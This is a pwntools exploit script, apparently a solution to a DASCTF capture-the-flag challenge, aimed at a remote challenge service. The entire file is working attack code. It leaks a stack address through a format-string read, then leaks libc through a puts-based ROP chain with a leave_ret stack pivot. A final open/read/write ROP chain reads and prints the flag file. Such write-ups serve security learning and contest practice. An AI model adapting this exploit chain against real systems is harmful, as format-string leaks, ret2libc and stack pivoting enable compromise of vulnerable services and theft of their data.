from pwn import *

context(os='linux', arch='amd64')
# p = process('./pwn')
p = remote('tcp.cloud.dasctf.com', 21495)
libc = ELF('./libc.so.6')
elf = ELF('./pwn')
# 泄漏栈地址
payload = b'%20$p'
p.send(payload)
p.recvuntil(b'0x')
stack_addr = int(p.recv(12), 16) - 0xd0
print(hex(stack_addr))
# 泄漏libc地址
pop_rdi = 0x0000000000401413
leave_ret = 0x00000000004012e1
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_addr = 0x04012E3

payload = p64(1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
payload = payload.ljust(176, b'a') + p64(stack_addr) + p64(leave_ret)
p.recv()
p.send(payload)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00'))
print(hex(puts_addr))

p.recvuntil(b'Now, please say something to DASCTF:')
base_addr = puts_addr - libc.symbols['puts']
open_addr = base_addr + libc.symbols['open']
read_addr = base_addr + libc.symbols['read']
write_addr = base_addr + libc.symbols['write']
pop_rsi = base_addr + 0x000000000002601f
pop_rdx = base_addr + 0x0000000000142c92
"""
orw
open, read, write
open('./flag')
read(0,buf,0x10)
write(1,buf,0x10)
"""
payload = b'flag\00aaa' \
          + p64(pop_rdi) + p64(stack_addr - 0x90) + p64(pop_rsi) + p64(0) + p64(open_addr) \
          + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(stack_addr - 0x90) + p64(pop_rdx) + p64(0x100) + p64(read_addr) \
          + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(stack_addr - 0x90) + p64(pop_rdx) + p64(0x100) + p64(write_addr)
payload = payload.ljust(176, b'a') + p64(stack_addr - 0x90) + p64(leave_ret)

p.send(payload)
p.recvuntil(b'Posted Successfully~\n')
print(p.recvuntil(b'}'))
p.recv()
p.interactive()

